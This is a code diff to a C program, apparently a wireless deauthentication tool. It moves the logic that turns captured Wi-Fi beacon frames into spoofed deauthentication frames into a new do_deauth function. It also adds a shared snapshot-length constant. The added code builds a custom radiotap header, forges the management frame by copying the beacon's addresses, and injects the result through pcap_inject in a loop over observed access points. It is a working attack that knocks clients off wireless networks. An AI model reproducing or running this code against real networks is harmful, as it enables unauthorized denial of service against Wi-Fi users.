@@ -22,6 +22,9 @@
 #include "radiotap.h"
 
 
+#define PCAP_SNAPLEN	500
+
+
 static void hexDump (char *desc, void *addr, int len) {
     int i;
     unsigned char buff[17];
@@ -136,9 +139,52 @@ static int radiotap_parse(u8 *pcap)
 	return rt_headerlen;
 }
 
+int do_deauth(pcap_t *capture, const struct ieee80211_mgmt *mgmt_rx, const int is_dryrun)
+{
+	static const u8 rtap_tx[] = {
+		0x00, 0x00, // <-- radiotap version
+		0x0c, 0x00, // <- radiotap header length
+		0x04, 0x80, 0x00, 0x00, // <-- bitmap
+		0x00, // <-- rate
+		0x00, // <-- padding for natural alignment
+		0x08, 0x00, // <-- TX flags (IEEE80211_RADIOTAP_F_TX_NOACK)
+	};
+	struct ieee80211_mgmt *mgmt_tx;
+	static u8 tx_buffer[sizeof(rtap_tx) + 24 + 2];
+	int ret;
+
+	/*
+	 * turn beacon into deauth:
+	 * use own radiotap header
+	 * change STYPE to deauth,
+	 * keep addresses unchanged,
+	 * increase sequence number,
+	 * add reason code
+	 */
+	memcpy(tx_buffer, rtap_tx, sizeof(rtap_tx));
+	mgmt_tx = (struct ieee80211_mgmt *) (tx_buffer + sizeof(rtap_tx));
+	memcpy(mgmt_tx, mgmt_rx, 24);
+
+	mgmt_tx->frame_control |= cpu_to_le16(IEEE80211_STYPE_DEAUTH);
+	mgmt_tx->seq_ctrl = cpu_to_le16(le16_to_cpu(mgmt_rx->seq_ctrl) + 0x00f0); // do not modify fragment number
+	mgmt_tx->u.deauth.reason_code = cpu_to_le16(WLAN_REASON_DEAUTH_LEAVING);
+
+	if (is_dryrun) {
+		hexDump(NULL, tx_buffer, sizeof(rtap_tx) + 24 + 2);
+	} else {
+		ret = pcap_inject(capture, tx_buffer, sizeof(rtap_tx) + 24 + 2);
+		if (ret != (sizeof(rtap_tx) + 24 + 2)) {
+			perror("Trouble injecting packet");
+			return -1;
+		}
+	}
+
+	return 0;
+}
+
 void deauth_run(pcap_t *capture, int nDelay, u8 *mac_list, size_t mac_list_size, int is_whitelist, int is_dryrun)
 {
-	u8 buffer[500];
+	u8 buffer[PCAP_SNAPLEN];
 	u8 *pcap = buffer; // XXX why is that required?
 	int ret, rt_headerlen;
 	struct ieee80211_mgmt *mgmt;
@@ -173,28 +219,8 @@ void deauth_run(pcap_t *capture, int nDelay, u8 *mac_list, size_t mac_list_size,
 		       mgmt->sa[4],
 		       mgmt->sa[5]);
 
-		/*
-		 * turn beacon into deauth:
-		 * keep radiotap header unchanged,
-		 * change STYPE to deauth,
-		 * keep addresses unchanged,
-		 * increase sequence number,
-		 * add reason code
-		 */
-		mgmt->frame_control |= cpu_to_le16(IEEE80211_STYPE_DEAUTH);
-		mgmt->seq_ctrl = cpu_to_le16(le16_to_cpu(mgmt->seq_ctrl) + 1000);
-		mgmt->u.deauth.reason_code = cpu_to_le16(WLAN_REASON_DEAUTH_LEAVING);
-
-		if (is_dryrun) {
-			hexDump(NULL, pcap, rt_headerlen + 24 + 2);
-		} else {
-			ret = pcap_inject(capture, pcap, rt_headerlen + 24 + 2);
-			if (ret != (rt_headerlen + 24 + 2)) {
-				perror("Trouble injecting packet");
-				break;
-			}
-		}
-
+		if (do_deauth(capture, mgmt, is_dryrun))
+			break;
 
 		if (nDelay)
 			usleep(nDelay);
@@ -312,7 +338,7 @@ int main(int argc, char *argv[])
 
 	// open the pcap interface
 	szErrbuf[0] = '\0';
-	capture = pcap_open_live(argv[optind], 800, 1, 20, szErrbuf);
+	capture = pcap_open_live(argv[optind], PCAP_SNAPLEN, 1, 20, szErrbuf);
 	if (capture == NULL) {
 		printf("Unable to open interface %s in pcap: %s\n",
 		    argv[optind], szErrbuf);
